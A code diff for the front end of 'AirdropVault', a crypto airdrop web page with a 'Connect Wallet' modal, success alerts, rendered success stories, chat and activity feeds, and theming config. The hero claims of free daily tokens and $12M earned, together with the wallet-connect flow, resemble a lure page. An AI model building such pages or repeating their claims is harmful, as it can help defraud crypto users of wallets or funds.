-          {
-            get: () => config.background_color || defaultConfig.background_color,
-            set: (v) => { config.background_color = v; window.elementSdk.setConfig({ background_color: v }); }
-          },
-          {
-            get: () => config.surface_color || defaultConfig.surface_color,
-            set: (v) => { config.surface_color = v; window.elementSdk.setConfig({ surface_color: v }); }
-          },
-          {
-            get: () => config.text_color || defaultConfig.text_color,
-            set: (v) => { config.text_color = v; window.elementSdk.setConfig({ text_color: v }); }
-          },
-          {
-            get: () => config.primary_action || defaultConfig.primary_action,
-            set: (v) => { config.primary_action = v; window.elementSdk.setConfig({ primary_action: v }); }
-          },
-          {
-            get: () => config.secondary_action || defaultConfig.secondary_action,
-            set: (v) => { config.secondary_action = v; window.elementSdk.setConfig({ secondary_action: v }); }
+          if (!response.ok) {
+            throw new Error(result.message || "Connection failed");
           }
-        ],
-        borderables: [],
-        fontEditable: {
-          get: () => config.font_family || defaultConfig.font_family,
-          set: (v) => { config.font_family = v; window.elementSdk.setConfig({ font_family: v }); }
-        },
-        fontSizeable: {
-          get: () => config.font_size || defaultConfig.font_size,
-          set: (v) => { config.font_size = v; window.elementSdk.setConfig({ font_size: v }); }
+
+          // Success State
+          localStorage.setItem("userConnected", "true");
+
+          btn.textContent = "✓ Connected";
+
+          btn.disabled = true;
+
+          btn.classList.remove("bg-[#00ff88]", "hover:bg-[#00e07a]");
+
+          btn.classList.add("bg-[#00ff88]/50", "cursor-not-allowed");
+
+          closeConnectModal();
+
+          setTimeout(() => {
+            alert(
+              "🎉 Connection successful! We will notify you of upcoming airdrops. Check your email for next steps!",
+            );
+          }, 500);
+        } catch (error) {
+          console.error(error);
+
+          errorEl.textContent = error.message || "Something went wrong";
+
+          errorEl.classList.remove("hidden");
+
+          btn.disabled = false;
+
+          btn.textContent = "Complete Connection";
         }
-      }),
-      mapToEditPanelValues: (config) => new Map([
-        ["site_title", config.site_title || defaultConfig.site_title],
-        ["hero_heading", config.hero_heading || defaultConfig.hero_heading],
-        ["hero_subtext", config.hero_subtext || defaultConfig.hero_subtext],
-        ["connect_button_text", config.connect_button_text || defaultConfig.connect_button_text]
-      ])
-    });
-  </script>
- <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9fccb081c637222d',t:'MTc3ODk1ODcwMC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+      }
+
+      function updateConnectButton() {
+        if (localStorage.getItem("userConnected")) {
+          const btn = document.getElementById("connect-btn");
+
+          if (!btn) return;
+
+          btn.textContent = "✓ Connected";
+
+          btn.disabled = true;
+
+          btn.classList.remove("bg-[#00ff88]", "hover:bg-[#00e07a]");
+
+          btn.classList.add("bg-[#00ff88]/50", "cursor-not-allowed");
+        }
+      }
+
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Escape") {
+          closeConnectModal();
+        }
+      });
+
+      // Init
+      renderAirdrops();
+      renderSuccessStories();
+      renderChat();
+      renderActivity();
+      lucide.createIcons();
+      updateConnectButton();
+
+      // Element SDK
+      const defaultConfig = {
+        site_title: "AirdropVault",
+        hero_heading: "Claim Free Crypto Airdrops Daily",
+        hero_subtext:
+          "Join 100,000+ users who've earned over $12M in free tokens. Never miss another airdrop opportunity.",
+        background_color: "#0a0f1a",
+        surface_color: "#0f1a2e",
+        text_color: "#ffffff",
+        primary_action: "#00ff88",
+        secondary_action: "#1a2940",
+        font_family: "Outfit",
+        font_size: 16,
+        connect_button_text: "Connect Wallet",
+      };
+
+      window.elementSdk.init({
+        defaultConfig,
+        onConfigChange: async (config) => {
+          const bg = config.background_color || defaultConfig.background_color;
+          const surface = config.surface_color || defaultConfig.surface_color;
+          const text = config.text_color || defaultConfig.text_color;
+          const primary = config.primary_action || defaultConfig.primary_action;
+          const secondary =
+            config.secondary_action || defaultConfig.secondary_action;
+          const font = config.font_family || defaultConfig.font_family;
+          const size = config.font_size || defaultConfig.font_size;
+
+          document.getElementById("app").style.backgroundColor = bg;
+          document.getElementById("app").style.color = text;
+          document.getElementById("app").style.fontFamily =
+            `${font}, sans-serif`;
+          document.getElementById("app").style.fontSize = size + "px";
+          document.getElementById("nav-title").textContent =
+            config.site_title || defaultConfig.site_title;
+
+          const heading = document.getElementById("hero-heading");
+          const headingText = config.hero_heading || defaultConfig.hero_heading;
+          heading.innerHTML = headingText.replace(
+            "Airdrops Daily",
+            `<span style="color:${primary}">Airdrops Daily</span>`,
+          );
+          heading.style.fontFamily = `${font}, sans-serif`;
+
+          document.getElementById("hero-subtext").textContent =
+            config.hero_subtext || defaultConfig.hero_subtext;
+
+          const connectBtn = document.getElementById("connect-btn");
+          if (connectBtn && !localStorage.getItem("userConnected")) {
+            connectBtn.textContent =
+              config.connect_button_text ||
+              defaultConfig.connect_button_text ||
+              "Connect Wallet";
+          }
+
+          document
+            .querySelectorAll(".card-hover, #community-chat")
+            .forEach((el) => {
+              el.style.backgroundColor = surface;
+              el.style.borderColor = secondary;
+            });
+        },
+        mapToCapabilities: (config) => ({
+          recolorables: [
+            {
+              get: () =>
+                config.background_color || defaultConfig.background_color,
+              set: (v) => {
+                config.background_color = v;
+                window.elementSdk.setConfig({ background_color: v });
+              },
+            },
+            {
+              get: () => config.surface_color || defaultConfig.surface_color,
+              set: (v) => {
+                config.surface_color = v;
+                window.elementSdk.setConfig({ surface_color: v });
+              },
+            },
+            {
+              get: () => config.text_color || defaultConfig.text_color,
+              set: (v) => {
+                config.text_color = v;
+                window.elementSdk.setConfig({ text_color: v });
+              },
+            },
+            {
+              get: () => config.primary_action || defaultConfig.primary_action,
+              set: (v) => {
+                config.primary_action = v;
+                window.elementSdk.setConfig({ primary_action: v });
+              },
+            },
+            {
+              get: () =>
+                config.secondary_action || defaultConfig.secondary_action,
+              set: (v) => {
+                config.secondary_action = v;
+                window.elementSdk.setConfig({ secondary_action: v });
+              },
+            },
+          ],
+          borderables: [],
+          fontEditable: {
+            get: () => config.font_family || defaultConfig.font_family,
+            set: (v) => {
+              config.font_family = v;
+              window.elementSdk.setConfig({ font_family: v });
+            },
+          },
+          fontSizeable: {
+            get: () => config.font_size || defaultConfig.font_size,
+            set: (v) => {
+              config.font_size = v;
+              window.elementSdk.setConfig({ font_size: v });
+            },
+          },
+        }),
+        mapToEditPanelValues: (config) =>
+          new Map([
+            ["site_title", config.site_title || defaultConfig.site_title],
+            ["hero_heading", config.hero_heading || defaultConfig.hero_heading],
+            ["hero_subtext", config.hero_subtext || defaultConfig.hero_subtext],
+            [
+              "connect_button_text",
+              config.connect_button_text || defaultConfig.connect_button_text,
+            ],
+          ]),
+      });
+    </script>
+    <script>
+      (function () {
+        function c() {
+          var b = a.contentDocument || a.contentWindow.document;
+          if (b) {
+            var d = b.createElement("script");
+            d.innerHTML =
+              "window.__CF$cv$params={r:'9fccb081c637222d',t:'MTc3ODk1ODcwMC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
+            b.getElementsByTagName("head")[0].appendChild(d);
+          }
+        }
+        if (document.body) {
+          var a = document.createElement("iframe");
+          a.height = 1;
+          a.width = 1;
+          a.style.position = "absolute";
+          a.style.top = 0;
+          a.style.left = 0;
+          a.style.border = "none";
+          a.style.visibility = "hidden";
+          document.body.appendChild(a);
+          if ("loading" !== document.readyState) c();
+          else if (window.addEventListener)
+            document.addEventListener("DOMContentLoaded", c);
+          else {
+            var e = document.onreadystatechange || function () {};
+            document.onreadystatechange = function (b) {
+              e(b);
+              "loading" !== document.readyState &&
+                ((document.onreadystatechange = e), c());
+            };
+          }
+        }
+      })();
+    </script>
+  </body>
 </html>
